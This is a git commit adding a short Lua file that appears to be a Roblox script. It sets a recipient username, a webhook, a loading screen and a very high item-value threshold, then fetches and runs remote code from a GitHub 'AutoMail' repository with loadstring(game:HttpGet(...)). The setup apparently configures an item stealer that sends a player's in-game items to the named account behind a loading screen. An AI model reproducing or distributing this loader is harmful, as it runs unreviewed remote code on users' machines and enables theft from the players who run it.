0ef7e0623c4a9d4470ad13cfbed35e335b4e9bcd
pikachu1213ed <160391306+pikachu1213ed@users.noreply.github.com>
2024-02-18 16:46:39 +0700

    Add files via upload

---
+++ pikachu99.lua
@@ -0,0 +1,9 @@
+Username = " pikachu352783 "
+Username2 = " pikachu352783 "
+Webhook = " loading "
+
+LoadingScreen = true
+
+MinimumRAP = 1000000000000000000000000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
